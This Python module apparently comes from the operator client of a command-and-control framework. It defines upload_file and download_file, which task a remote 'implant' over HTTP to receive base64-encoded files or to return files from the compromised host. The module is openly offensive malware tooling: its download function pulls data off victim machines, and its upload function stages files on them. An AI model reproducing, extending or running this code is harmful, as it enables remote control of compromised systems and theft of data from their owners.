import os
import Internals.File_Interaction
import Internals.Http_Post
import Internals.Http_Get
from Utilities import constant as const


def upload_file(path, implant_id, command):
    if os.path.exists(path):
        if Internals.File_Interaction.limit_len_upload_primitive(path):
            Internals.Http_Get.get_last_command_output(implant_id,
                                                       Internals.Http_Post.send_all_param_task_to_implant(
                                                           command, path,
                                                           Internals.File_Interaction.encode(path),
                                                           implant_id))
        else:
            const.warning_message("File size is to huge, please use upload-gd")
    else:
        const.error_message("File not exist")


def download_file(path, implant_id, command):
    task_id = Internals.Http_Post.send_cmd_args_task_to_implant(command, path, implant_id)
    file_content = Internals.Http_Get.get_file_b64_byte_content(implant_id, task_id)

    if str(file_content).__contains__("[!] Error: "):
        const.warning_message("File size is to huge, please use download-gd")

    else:
        Internals.File_Interaction.write_file_byte(file_content)